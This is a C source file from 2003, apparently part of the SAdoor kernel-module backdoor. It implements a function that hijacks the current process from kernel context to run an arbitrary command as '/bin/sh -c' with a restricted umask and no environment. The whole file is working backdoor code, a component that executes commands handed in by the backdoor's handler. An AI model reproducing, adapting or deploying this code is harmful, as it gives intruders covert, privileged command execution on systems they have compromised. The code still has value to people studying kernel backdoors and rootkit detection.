/*
 *  File: do_system.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor kmod userland system() call.
 *  Version: 1.0
 *  Date: Thu Jul  3 15:48:22 CEST 2003
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/errno.h>
#include <sys/kernel.h>
#include <sys/proc.h>  
#include <sys/systm.h>
#include <sys/unistd.h>
#include <sys/kernel.h>
#include <sys/mount.h>
#include <sys/syscallargs.h>
#include "sadoor.h"

#define SHELL "/bin/sh"

/*
 * Allocate memory in userland and execute
 * the command as 'SHELL -c "cmd"'.
 */
void
do_system(void *cmd)
{
    struct sys_execve_args *args;
    struct sys_umask_args *uarg;
    struct proc *p;
	register_t retval[2];
    u_char *usp;
    int error = 0;

    p = curproc;

	if (p == NULL) {
		log(1, "do_system(): curproc is NULL\n");
		return;
	}

	debug(3, "Entered do_system(), curproc = 0x%08x, pid %d\n", 
		curproc, curproc->p_pid);

    /* Set up memory for the arguments */
    usp = (u_char *)uland_calloc(strlen((u_char *)cmd) + 
		sizeof(struct sys_execve_args) + 48 + sizeof(struct sys_umask_args));
    
	uarg = (struct sys_umask_args *)(usp + strlen((u_char *)cmd) + 
		sizeof(struct sys_execve_args) + 48);

    /*
     * Set umask
     */
    debug(3, "Setting umask to 0%04o\n", SAKMOD_UMASK);
    (void)suword(&SCARG(uarg, newmask), SAKMOD_UMASK); 
    if ( (error = sys_umask(p, (void *)uarg, retval)) && (error != EJUSTRETURN)) {
        log(1, "Error: Could not set umask\n");
        exit1(p, error);
    }

    /* Set up sys_execve_args pointer */
    args = (struct sys_execve_args *)usp;

    /* Set shell */
    (void)suword(&SCARG(args, path), 
		(int)(usp + sizeof(struct sys_execve_args)));
    (void)copyout(SHELL, (u_char *)SCARG(args, path), strlen(SHELL));

    /* Set argp, (four pointers) */
    (void)suword(&SCARG(args, argp), 
		(int)(SCARG(args, path) + strlen(SCARG(args, path)) +1));

    /* Set argp[0] */
    (void)suword((void *)&SCARG(args, argp)[0], 
		(int)(SCARG(args, argp) + 4*sizeof(char *)));
    (void)copyout(SHELL, (void *)SCARG(args, argp)[0], strlen(SHELL));

    /* Set argp[1] , -c option */
    (void)suword((void *)&SCARG(args, argp)[1], 
		(int)(SCARG(args, argp)[0] + strlen(SCARG(args, argp)[0]) +1));
    (void)copyout("-c", (void *)SCARG(args, argp)[1], 2);

    /* Set argp[2], the command */
    (void)suword((void *)&SCARG(args, argp)[2], 
		(int)(SCARG(args, argp)[1] + strlen(SCARG(args, argp)[1]) +1));
    (void)copyout(cmd, (void *)SCARG(args, argp)[2], strlen(cmd));

    /* Set argp[3], terminator */
    (void)suword((void *)&SCARG(args, argp)[3], (int)NULL);

    /* No environment */
    (void)suword(&SCARG(args, envp), (int)NULL);

	/* Free the memory allocated in handle_command() */
	kspace_free(cmd);

    debug(3, "Calling (from pid=%d, ppid=%d) execve(\"%s\", "
		"{ \"%s\", \"%s\", \"%s\", NULL}, NULL)\n",
        p->p_pid, p->p_pptr->p_pid, SCARG(args, path), 
		SCARG(args, argp)[0], SCARG(args, argp)[1], SCARG(args, argp)[2]);

    /* Call execve */
    if ( (error = sys_execve(p, (void *)args, retval)) && (error != EJUSTRETURN)) {
        	log(1, "Error: execve() failed: %d\n", error);
        	exit1(p, error);
    }
}
